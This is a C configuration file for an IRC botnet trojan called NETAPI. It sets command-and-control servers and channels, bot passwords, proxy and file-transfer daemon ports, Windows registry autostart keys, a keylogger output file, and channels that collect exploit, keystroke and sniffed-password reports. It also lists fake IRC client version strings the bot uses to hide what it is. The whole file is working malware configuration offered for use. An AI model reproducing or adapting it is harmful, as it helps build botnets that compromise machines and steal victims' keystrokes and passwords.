// # Version DE NETAPI 2oo6 PRUEBA ALFA .. By Norman And Morgan .//irc.Gigachat.Net #Morgan
// bot configuration (generic) - doesn't need to be encrypted
int port = 7000;				// server port
int port2 = 8585;				// backup server port
int socks4port = 9999;			// Port # for sock4 daemon to run on  - CHANGE THIS!!!
int tftpport = 69;				// Port # for tftp daemon to 
int httpport = 9421;			// Port # for http daemon to run on
int rloginport = 513;			// Port # for rlogin daemon to run on
BOOL topiccmd = TRUE;			// set to TRUE to enable topic commands
BOOL rndfilename = FALSE;		// use random file name
BOOL AutoStart = TRUE;			// enable autostart registry keys
char prefix = '.';				// command prefix (one character max.)
int maxrand = 5;				// how many random numbers in the nick
int nicktype = CONSTNICK;		// nick type (see rndnick.h)
BOOL nickprefix = TRUE;	    // nick uptime & mirc prefix

char botid[] = "NETAPI";							// bot id
char version[] = "NETAPI-ASN.v1.9.4]";			// Bots !version reply
char password[] = "netapiwsk";						// bot password
char server[] = "server.com";			// server
char serverpass[] = "";							// server password
char channel[] = "#netapi.com";		// channel that the bot should join
char chanpass[] = "wsk";							// channel password
char server2[] = "server.com";							// backup server (optional)
char channel2[] = "#netapi.com";							// backup channel (optional)
char chanpass2[] = "420";							// backup channel password (optional)
char filename[] = "netapi.exe";				// destination file name
char keylogfile[] = "saw.dat";					// keylog filename
char valuename[] = "NPF Value";			// value name for autostart
char nickconst[] = "[Neta|PI]";						// first part to the bot's nick
char modeonconn[] = "+RI-x";						// Can be more than one mode and contain both + and -
char chanmode[] = "sntm";						// Channel mode after joining
char exploitchan[] = "#netapilog.com";						// Channel where exploit messages get redirected
char keylogchan[] = "#netapikey.com";							// Channel where keylog messages get redirected
char psniffchan[] = "#spsniffnetapi.com";							// Channel where psniff messages get redirected 

char *authost[] = {
	"*@*"
};

char *versionlist[] = {
	"mIRC v6.12 Khaled Mardam-Bey",
	"mIRC v6.03 Khaled Mardam-Bey",
	"BitchX-74p2+ by panasync - CYGWIN32/95 4.0 : Keep it to yourself!",
	"..(argon/1g) :bitchx-75 : Keep it to yourself!",
	"BitchX-70alpha14+tcl by panasync - Linux 2.0.27  Keep it to yourself!",
	"BitchX-1.0c19+ by panasync - FreeBSD 4.10-BETA : Keep it to yourself!",
	"BitchX-74p2+1.3f/SunOS 5.6 :(c)rackrock/bX [3.0.1�8] : Keep it to yourself!",
	"BitchX-1.0c18+ by panasync - IRIX 6.5.10 Silicon Graphics : Keep it to yourself!",
	"[bx.75p1] linux 2.0.36 [embryonic.22b3] :what is this that stands before me",
	"ircII EPIC4pre2 Linux 2.0.34 - Accept no limitations.",
	"ircII EPIC4pre2 SunOS 5.6 - cypher(beta\\one) -myd!nas :one step closer to world domination",
	"ircII 2.9-BitchX-60 Linux 1.2.8 :bitZ%summer '96(bitX%summer'96)",
	"ircII 2.8.2 SunOS 5.6 :ircii 2.8: almost there...",
	"ircII 2.9_base OSF1 V4.0 :ircii 2.8: almost there...",
	"xchat 1.8.10 Linux 2.4.25p1mp [i686/501MHz]",
	"ircN 7.27 + 7.0 - everyone i know goes away in the end -",
	"irssi v0.8.4 - running on Linux i686",
	"mIRC32 v5.71 K.Mardam-Bey",
	"mIRC32 v5.82 K.Mardam-Bey",
	"mIRC32 v6.01 K.Mardam-Bey",
	"mIRC32 v6.03 K.Mardam-Bey",
	"mIRC32 v6.12 K.Mardam-Bey",
	"mIRC v5.71 K.Mardam-Bey",
	"mIRC v5.82 K.Mardam-Bey",
	"mIRC v6.01 K.Mardam-Bey",
	"mIRC v6.03 K.Mardam-Bey",
	"mIRC v6.1 K.Mardam-Bey",
	"mIRC v6.01 K.Mardam-Bey",
	"mIRC v6.03 K.Mardam-Bey",
	"mIRC v6.10 K.Mardam-Bey",
	"mIRC v6.12 K.Mardam-Bey",
	"mIRC v6.14 K.Mardam-Bey",
	"mIRC32 v1.0 K .Mardam-Bey",
	"eggdrop v1.6.15",
	"eggdrop v1.6.13",
	"StormBot.TCL 3.1.beta.2.10 by Xone & Domino (coders@stormbot.org)",
	"C++ based IRC Client by Jumpincow/shaxxxa/mo00",
	"HydraIRC v0.3.133-Test (14/March/2004) by Dominic Clifton aka Hydra - #HydraIRC on EFNet",
	"WSIRC 2.03-R - CopyRight 1994, 1995 Caesar M Samsi csamsi@clark.net TEXT CHANNEL",
	"ircN 6.03 for mIRC - are we being punished for fate -",
	"ircN 7.0rc.6 + 7.0rc.5 + 7.0rc.4 for mIRC - the devils of truth steal the souls of the free -",
	"osiris-1c/bitchx-75p1 + autobot(bx) p3x3 : that time then and once again..",
	"xircon[b4] + doot.3b[pawt] be-two + anony(v1) + aolsay(impulse) + deepthought + saq(dbg)",
	"AmIRC/AmigaOS 2.0.4 by Oliver Wagner <owagner@vapor.com> : http://www.vapor.com/ : [#0000D63F] : The slow mess client",
	"Quarterdeck Global Chat 1.2.9 for Macintosh",
	"Ircle 3.0b10 US PPC 12/15/1997 21:07:34 PM. #239C23AF21B",
	"Eggdrop 1.3.24i (c)1997 Robey Pointer",
	"JPilot IRC Java Client 2.32",
};

char regkey1[]="Software\\Microsoft\\Windows\\CurrentVersion\\Run";
char regkey2[]="Software\\Microsoft\\Windows\\CurrentVersion\\RunServices";
char regkey3[]="Software\\Microsoft\\OLE";
char regkey4[]="SYSTEM\\CurrentControlSet\\Control\\Lsa";
